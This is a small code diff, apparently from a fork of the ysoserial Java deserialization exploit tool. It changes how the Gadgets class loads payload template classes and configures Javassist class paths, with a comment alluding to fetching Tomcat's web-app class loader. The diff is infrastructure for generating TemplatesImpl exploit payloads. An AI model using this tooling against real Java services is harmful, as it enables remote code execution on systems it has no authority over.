@@ -11,6 +11,7 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
+import javassist.LoaderClassPath;
 import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.lang.RandomStringUtils;
 import org.apache.wicket.util.file.Files;
@@ -87,7 +88,7 @@ public class Gadgets {
 
         if (command.startsWith("CLASS:")) {
             // 这里不能让它初始化，不然从线程中获取WebappClassLoaderBase时会强制类型转换异常。
-            Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6), false, Gadgets.class.getClassLoader());
+            Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6), false, Thread.currentThread().getContextClassLoader());
             return createTemplatesImpl(clazz, null, null, tplClass, abstTranslet, transFactory);
         } else if (command.startsWith("FILE:")) {
             byte[] bs = Files.readBytes(new File(command.substring(5)));
@@ -102,7 +103,8 @@ public class Gadgets {
         final T templates = tplClass.newInstance();
         byte[] classBytes = new byte[0];
         ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(abstTranslet));
+//        pool.insertClassPath(new ClassClassPath(abstTranslet));
+        pool.insertClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
         CtClass superC = pool.get(abstTranslet.getName());
         CtClass ctClass;
         if (command != null) {
